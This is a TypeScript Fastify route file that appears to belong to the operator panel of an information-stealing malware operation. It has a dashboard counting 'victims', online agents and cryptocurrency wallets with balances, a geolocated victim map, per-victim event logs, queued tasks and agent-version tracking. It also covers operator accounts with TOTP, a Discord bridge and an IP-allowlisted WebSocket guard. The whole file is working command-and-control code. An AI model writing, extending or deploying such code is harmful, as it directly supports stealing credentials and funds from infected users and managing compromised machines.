import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { createReadStream } from 'node:fs';
import { readFile, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { bridgeStatus, runBridgeBootstrap, startDiscordBridge, stopDiscordBridge } from '../services/discord-bridge';
import { audit } from '../lib/audit';
import { bad, notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { hashPassword, passwordPolicy } from '../lib/password';
import { newTotpSecret, totpUri } from '../lib/totp';

const LOG_DIR = process.env.LOG_DIR ?? './logs';

export const miscRoutes: FastifyPluginAsync = async (app) => {
  app.get('/dashboard', async () => {
    const since = new Date(Date.now() - 90_000);
    const recent = { OR: [{ lastHeartbeatAt: { gte: since } }, { lastAgentMessageAt: { gte: since } }] };
    const [total, online, wallets, balances, artifacts, queued, byOs, byCountry] = await Promise.all([
      prisma.victim.count(),
      prisma.victim.count({ where: { ...recent, revokedAt: null } }),
      prisma.wallet.count(),
      prisma.wallet.count({ where: { NOT: { balance: null } } }),
      prisma.artifact.count({ where: { status: 'ready' } }),
      prisma.task.count({ where: { status: { in: ['queued', 'running'] } } }),
      prisma.victim.groupBy({ by: ['os'], _count: { _all: true } }),
      prisma.victim.groupBy({ by: ['country'], _count: { _all: true }, orderBy: { _count: { country: 'desc' } }, take: 8 })
    ]);
    return {
      counters: { total, online, wallets, balances, artifacts, queued },
      byOs: byOs.map((row) => ({ os: row.os, count: row._count._all })),
      byCountry: byCountry.map((row) => ({ country: row.country ?? 'unknown', count: row._count._all }))
    };
  });

  app.get('/map', async () => {
    const rows = await prisma.victim.findMany({
      where: { lat: { not: null }, lon: { not: null } },
      select: { id: true, hostname: true, os: true, country: true, city: true, lat: true, lon: true, lastHeartbeatAt: true, lastAgentMessageAt: true },
      take: 5000
    });
    return { points: rows.map((row) => ({ ...row, online: Date.now() - Math.max(row.lastHeartbeatAt.getTime(), row.lastAgentMessageAt.getTime()) < 90_000 })) };
  });

  app.get('/notifications', async (request) => {
    const unread = (request.query as { unread?: string }).unread === '1';
    const items = await prisma.notification.findMany({ where: unread ? { readAt: null } : {}, orderBy: { createdAt: 'desc' }, take: 100 });
    const count = await prisma.notification.count({ where: { readAt: null } });
    return { items, unread: count };
  });

  app.post('/notifications/read', async (request) => {
    const { ids } = z.object({ ids: z.array(z.string().uuid()).max(500).default([]) }).parse(request.body);
    await prisma.notification.updateMany({ where: ids.length ? { id: { in: ids } } : { readAt: null }, data: { readAt: new Date() } });
    return { ok: true };
  });

  app.get('/events', async (request) => {
    const query = z.object({ victim: z.string().uuid().optional(), kind: z.string().max(48).optional(), limit: z.coerce.number().int().max(500).default(100) }).parse(request.query);
    const items = await prisma.event.findMany({
      where: { ...(query.victim ? { victimId: query.victim } : {}), ...(query.kind ? { kind: query.kind } : {}) },
      orderBy: { createdAt: 'desc' },
      take: query.limit,
      include: { victim: { select: { id: true, hostname: true } } }
    });
    return { items };
  });

  app.get('/audit', async (request) => {
    const query = z.object({ q: z.string().max(128).optional(), operator: z.string().uuid().optional(), entity: z.string().max(32).optional(), limit: z.coerce.number().int().max(1000).default(200) }).parse(request.query);
    const items = await prisma.auditLog.findMany({
      where: {
        ...(query.operator ? { operatorId: query.operator } : {}),
        ...(query.entity ? { entity: query.entity } : {}),
        ...(query.q ? { OR: [{ action: { contains: query.q } }, { entityId: { contains: query.q } }] } : {})
      },
      orderBy: { createdAt: 'desc' },
      take: query.limit,
      include: { operator: { select: { email: true } } }
    });
    return { items };
  });

  app.get('/audit/export', async (request, reply) => {
    const format = (request.query as { format?: string }).format === 'json' ? 'json' : 'csv';
    const rows = await prisma.auditLog.findMany({ orderBy: { createdAt: 'desc' }, take: 20000, include: { operator: { select: { email: true } } } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'export.audit', entity: 'audit_log', ip: request.clientIp });
    if (format === 'json') {
      reply.header('content-type', 'application/json');
      reply.header('content-disposition', 'attachment; filename="audit.json"');
      return rows;
    }
    const head = 'at,operator,action,entity,entity_id,ip,data\n';
    const body = rows.map((row) => [row.createdAt.toISOString(), row.operator?.email ?? '', row.action, row.entity, row.entityId ?? '', row.ip ?? '', JSON.stringify(row.data)].map((v) => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n');
    reply.header('content-type', 'text/csv');
    reply.header('content-disposition', 'attachment; filename="audit.csv"');
    return head + body;
  });

  app.get('/operators', { preHandler: requireRole('admin') }, async () => {
    const items = await prisma.operator.findMany({ orderBy: { createdAt: 'asc' }, select: { id: true, email: true, role: true, disabled: true, totpEnabled: true, lastLoginAt: true, createdAt: true } });
    return { items };
  });

  app.post('/operators', { preHandler: requireRole('admin') }, async (request, reply) => {
    const input = z.object({ email: z.string().email(), password: z.string(), role: z.enum(['admin', 'operator', 'viewer']) }).parse(request.body);
    const policy = passwordPolicy(input.password);
    if (policy) throw bad('weak_password', policy, 422);
    const secret = newTotpSecret();
    const operator = await prisma.operator.create({
      data: { email: input.email.toLowerCase(), passwordHash: await hashPassword(input.password), role: input.role, totpSecret: secret }
    });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.create', entity: 'operator', entityId: operator.id, ip: request.clientIp, data: { role: input.role } });
    return reply.code(201).send({ id: operator.id, email: operator.email, totpSecret: secret, uri: totpUri(operator.email, secret) });
  });

  app.delete('/operators/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    if (id === request.operator!.id) throw bad('self_delete', 'cannot delete the signed-in operator', 409);
    const operator = await prisma.operator.findUnique({ where: { id } });
    if (!operator) throw notFound('operator');
    if (operator.role === 'admin') {
      const admins = await prisma.operator.count({ where: { role: 'admin', disabled: false } });
      if (admins <= 1) throw bad('last_admin', 'create another admin before deleting this one', 409);
    }
    await prisma.operator.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.delete', entity: 'operator', entityId: id, ip: request.clientIp, data: { email: operator.email } });
    return { ok: true };
  });

  app.patch('/operators/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = z.object({ role: z.enum(['admin', 'operator', 'viewer']).optional(), disabled: z.boolean().optional(), password: z.string().optional() }).parse(request.body);
    if (input.password) {
      const policy = passwordPolicy(input.password);
      if (policy) throw bad('weak_password', policy, 422);
    }
    await prisma.operator.update({
      where: { id },
      data: { role: input.role, disabled: input.disabled, ...(input.password ? { passwordHash: await hashPassword(input.password) } : {}) }
    });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.update', entity: 'operator', entityId: id, ip: request.clientIp, data: input });
    return { ok: true };
  });

  app.get('/logs', async (request) => {
    const file = (request.query as { file?: string }).file ?? 'api.log';
    if (!/^[\w.-]+\.log$/.test(file)) throw bad('bad_file', 'invalid log name');
    const path = join(LOG_DIR, file);
    const info = await stat(path).catch(() => null);
    if (!info) throw notFound('log');
    const size = Math.min(info.size, 512 * 1024);
    const handle = await readFile(path);
    return { file, size: info.size, text: handle.subarray(Math.max(0, handle.length - size)).toString('utf8') };
  });

  app.get('/logs/download', async (request, reply) => {
    const file = (request.query as { file?: string }).file ?? 'api.log';
    if (!/^[\w.-]+\.log$/.test(file)) throw bad('bad_file', 'invalid log name');
    reply.header('content-type', 'text/plain');
    return reply.send(createReadStream(join(LOG_DIR, file)));
  });

  app.get('/versions', async () => {
    let release = process.env['SPC_RELEASE_VERSION'] ?? '';
    if (!release) {
      for (const candidate of [join(process.cwd(), '..', 'gradle.properties'), join(process.cwd(), 'gradle.properties')]) {
        const text = await readFile(candidate, 'utf8').catch(() => '');
        const match = /^mod_version=(.+)$/m.exec(text);
        if (match) {
          release = match[1]!.trim();
          break;
        }
      }
    }
    const rows = await prisma.victim.findMany({ select: { agentVersion: true }, where: { revokedAt: null }, take: 5000 });
    const versions = new Map<string, number>();
    for (const row of rows) versions.set(row.agentVersion || 'unknown', (versions.get(row.agentVersion || 'unknown') ?? 0) + 1);
    const outdated = release
      ? rows.filter((row) => row.agentVersion && row.agentVersion !== release).length
      : 0;
    return {
      release: release || null,
      agents: Array.from(versions, ([version, count]) => ({ version, count })),
      outdated
    };
  });

  app.get('/health', async () => ({ ok: true, version: 1, uptime: Math.floor(process.uptime()) }));

  app.get('/discord/status', async () => bridgeStatus());

  app.post('/discord/restart', { preHandler: requireRole('admin') }, async () => {
    stopDiscordBridge();
    return { started: await startDiscordBridge() };
  });

  app.get('/discord/ignored', { preHandler: requireRole('admin') }, async () => {
    const items = await prisma.discordIgnore.findMany({ orderBy: { createdAt: 'desc' }, take: 200 });
    return { items };
  });

  app.delete('/discord/ignored/:channelId', { preHandler: requireRole('admin') }, async (request) => {
    const { channelId } = z.object({ channelId: z.string().min(1).max(40) }).parse(request.params);
    const removed = await prisma.discordIgnore.deleteMany({ where: { channelId } });
    if (removed.count === 0) throw notFound('ignored channel');
    await audit(prisma, { operatorId: request.operator?.id, action: 'discord.relink', entity: 'discord_channel', entityId: channelId, ip: request.clientIp });
    void runBridgeBootstrap();
    return { ok: true };
  });

};

export const wsGuard = async (socket: import('ws').WebSocket, request: import('fastify').FastifyRequest): Promise<boolean> => {
  const { verifySession, COOKIE } = await import('../lib/jwt');
  const { allowlisted, clientIp } = await import('../lib/ip');
  const deny = (reason: string): boolean => {
    try {
      socket.close(4401, reason);
    } catch {
      // already closing
    }
    return false;
  };
  const ip = clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY);
  if (!allowlisted(ip, env.allowlist)) return deny('ip_not_allowlisted');
  const token = request.cookies[COOKIE];
  if (!token) return deny('no_session');
  const claims = await verifySession(token).catch(() => null);
  if (!claims) return deny('bad_session');
  const session = await prisma.session.findUnique({ where: { id: claims.sid } });
  if (!session || session.revokedAt || session.expiresAt < new Date()) return deny('expired_session');
  return true;
};
